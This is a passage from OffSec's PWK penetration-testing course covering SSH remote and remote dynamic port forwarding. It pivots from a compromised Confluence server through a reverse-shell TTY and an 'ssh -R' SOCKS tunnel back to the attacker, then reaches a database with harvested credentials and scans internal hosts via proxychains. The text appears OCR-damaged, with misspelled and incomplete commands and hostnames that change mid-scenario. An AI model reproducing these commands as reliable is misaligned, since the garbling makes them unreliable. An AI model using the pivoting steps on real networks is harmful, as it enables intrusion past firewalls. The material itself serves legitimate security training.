
# OffSec Penetration Testing with Kali Linux

WAN DMZ INTERNAL

![](img/336d6ea891e7464f18ad64426619ced4_591_0.png)

Figure 250: The SSH remote port forward command running

We can now start probing port 2345 on the loopback interface of our Kali machine, as though we are probing the PostgreSQL database port on PGDATABASE01 directly. On our Kali machine, we will use psql, passing 127.0.0.1 as the host (-h), 2345 as the port (p), and using the database credentials of the postgres user (-U) we found earlier on CONFLUENCE01.

```
kali@kali:~$ psql -h 127.0.0.1 -p 2345 -U postgres
Password for user postgres
pgsql (14.2 (Debian 14.2-1)), server 12.11 (Ubuntu 12.11-ubuntu20.04.1)
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA256, bit: 256, compression: off)
Type="help" for help.
```

| Name | Owner | Encoding | Collate | Ctype | Access privileges |
| :--- | :--- | :--- | :--- | :--- | :--- |
| confluence | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 | + |
| postgres | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 | =c/postgres |
| template1 | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 | =c/postgres=Ct/postgres |
| templatel | postgres | UTF8 | en_US_UTF-8 | en_US_UTF-8 | =c/postgres=Ct/postgres |

(4 rows)
Listing 519 - Listing databases on the PGDATABASE01, using psql through the SSH remote port forward.

```
postgres#
```

Success! We are now interacting with the PostgreSQL instance running on PGDATABASE01 through our SSH remote port forward by connecting to port 2345 on our own Kali machine.

In this section, we create an SSH remote port forward to allow us to connect to an internal database server from our Kali machine. We did while traversing a perimeter firewall, which would otherwise block connections.

## 18.3.4 SSH Remote Dynamic Port Forwarding

With remote port forwarding, we were able to forward packets to one socket per SSH connection. However as we found with local forwarding, this single-socket-per-connection limitation slow us down. We often want more flexibility when attacking networks, especially in the enumeration stages.

PWK - Copyright © 2023 OffSec Services Limited. All rights reserved.

# OffSec

Luckily, remote port forwarding can provide this flexibility. Just as the name suggests, remote dynamic port forwarding creates a dynamic port forward in the remote configuration. SOCKS proxy port is bound to the SSH server, and traffic is forwarded from the SSH client.

To conceptualize how useful this might be, let's apply it to our previous scenario. The following diagram illustrates how the network layout would improve if we were to apply remote port forwarding to the remote port forwarding scenario.

![](img/336d6ea891e7464f18ad64426619ced4_592_0.png)

Figure 251: The ssh dynamic port forwarding applied to the remote port forward scenario

It's much more flexible. Suddenly, we are able to connect to other ports and hosts through the same connection.

Remote dynamic port forwarding is just another instance of dynamic port forwarding, so we gain all the flexibility of traditional dynamic port forwarding alongside the benefits of the remote configuration. We are able to connect to any port on which CONFLUENCE01 has access to passing SOCKS-formatted packets through the SOCKS proxy port that is bound on our Kali machine.

> Remote dynamic port forwarding has only been available since October 2017's OpenSSH 7.6. Despite this, only the OpenSSH client needs to be version 7.6 or above to use it - the server version doesn't matter.

Let extend our scenario again. This time find a Windows server (MULTISER03) on the DMZ network. The firewall prevents us from connecting to any port on MULTISER03, or any port other than TCP/8090 on CONFLUENCE01 from our Kali machine. We can SSH out from CONFLUENCE01 to our Kali machine, then create a remote dynamic port forward so we can start enumerating MULTISER03 from Kali.

Once connected, our network should be organized like the following diagram:

# OffSec

Penetration Testing with Kali Linux

WAN

DMZ

INTERNAL

![](img/336d6ea891e7464f18ad64426619ced4_593_0.png)

Figure 252: The SSH dynamic port forwarding setup we are aiming for

The SSH session is initiated by CONFLUENCE01, connecting to the Kali machine, which is running an SSH server. The SOCKS proxy port is bound to the Kali machine on TCP/9998. Packets sent to that port will be pushed back through the SSH tunnel to CONFLUENCE01, where they will be forwarded based on where they are addressed - in this case, MULTISER02.

To demonstrate how useful remote port forwarding can be, let's set up an example in the lab. Once we have a reverse shell from CONFLUENCE01, spawned a TTY shell within it, and enabled SSH on our Kali machine, we can start crafting dynamic port forwarding.

The remote port forwarding command is relatively simple (slightly confusingly it uses the -R option as classic port forwarding). The difference is that when we want to create a dynamic port forward, pass only one socket: the socket we want to listen on the SSH server. We do not need to specify an IP address, if we just pass a port, it will be bound to the loopback interface of the SSH server by default. To bind the SOCKS proxy to port 9998 on the loopback interface of our Kali machine, we simply -R 9998 to the command we run on CONFLUENCE01. We'll also pass the -N flag to prevent a shell from being opened.

```
confluence01:/opt/atlas/bin$ python3 -c 'import pty; pty.spawn("/bin/bash")'
confluence01:/opt/atlas/bin$ ssh -N -R 9998:192.168.1.4
```
could not create directory '/home/confluence/'
The authenticity of '192.168.1.4' can't be established. ECDSA fingerprint: SHA256:AAAd7Plzremxh
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to list of known hosts (/home/confluence/known_hosts).
kali@192.168.1.4:password:

Listing 550 - Making the SSH connection with the remote port forwarding option.

PWK - © 2023 OffSec Services. All rights reserved.

# OffSec

Penetration Testing with Kali Linux

Back on Kali, we can check if 9998 is bound using ss.

```
kali@kali:~ sudo ss -ntpl
Netid State Recv-Q Send-Q Local Address:Port Peer Address:Process
tcp LISTEN 0 0 127.0.0.1:9998 0.0.0.0:* users("sshd",pid=93908,fd=99)
tcp LISTEN 0 0 0.0.0.0:22 0.0.0:* users("sshd",pid=181432,fd=3)
tcp LISTEN 0 0 [::]:9998 [::]* users("sshd",pid=93908,fd=7)
tcp LISTEN 0 0 [::]:22 [::]* users("sshd",pid=181432,fd=4)
```
Listing 551 - Port bound to both IPv4 and IPv6 loopback interfaces on the Kali machine.

The SOCKS proxy port has been bound on both the IPv4 and IPv6 loopback interfaces on our Kali machine. We're ready to use it!

Just as we did in the classic dynamic proxy example, we can use Proxchains to tunnel traffic over our SOCKS proxy port. We edit our Proxchains configuration file at /etc/proxchains4.conf on Kali machine to reflect our local SOCKS proxy port.

```
kali@kali:~ tail /etc/proxchains.conf
# proxy types: http, socks5, raw
# raw: The traffic is simply forwarded to the proxy without modification.
# (auth types supported: "basic"-http "user/pass" socks )
# [ProxyList]
# add proxy here ...
# meanwhile
# defaults set to "tor"
socks5 127.0.0.1 9998
```

Listing 552 - Editing the Proxchains configuration file to point to the new SOCKS proxy port for 9998.

We then run nmap with proxieschains as we did before, but using MULTISER.

```
kali@kali:~ proxieschains nmap -vvv -ST --top-ports=20 -n 10.4.50.64
[proxchains] config file found: /etc/proxchains4.conf
[proxchains] reloading /usr/lib/x86_64-linux-gnu/libproxchains.so
Host key discovery (-). All addresses have been marked 'up' and scan times may be slower.
Starting nmap 7.92 (https://nmap.org ) at 2022-07-20 06:25 EDT
Initiating Connection at 06:25
Scanning 10.4.50.64 [20] ports
[proxchains] Strict chain
127.0.0.1:9998 10.4.50.64:22 <-- connection error or timeout...
[proxchains] Strict chain
127.0.0.1:9998 10.4.50.64:135 ... OK
Discovered open port 135/tcp on 10.4.50.64
Completed Scan at 06:28, 21.26s elapsed (20 total ports)
nmap scan report for 10.4.50.64
Host is up, received user-set (6.7s latency).
Scanned at 2022-07-20 06:25:25 EDT for 210

PORT STATE REASON
21/tcp closed ftp conn-refused
```
